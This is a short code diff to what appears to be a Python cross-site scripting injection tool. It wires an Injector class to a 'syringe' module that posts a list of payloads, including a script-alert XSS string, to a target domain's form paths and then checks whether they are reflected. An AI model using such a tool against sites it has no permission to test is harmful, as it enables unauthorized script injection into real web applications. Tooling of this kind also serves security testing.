@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 import requests
-from . import verify
+from . import verify, syringe
 
 PAYLOADS=[
     "<script>alert(\"naive-xss\")</script>",
@@ -45,7 +45,7 @@ class Injector(object):
         self.verify()
 
     def inject(self):
-        pass
+        syringe.inject(self.session, self.domain, self.post_paths, self.payloads)
 
     def verify(self):
         verify.check(self.session, self.domain, self.get_paths, self.payloads)
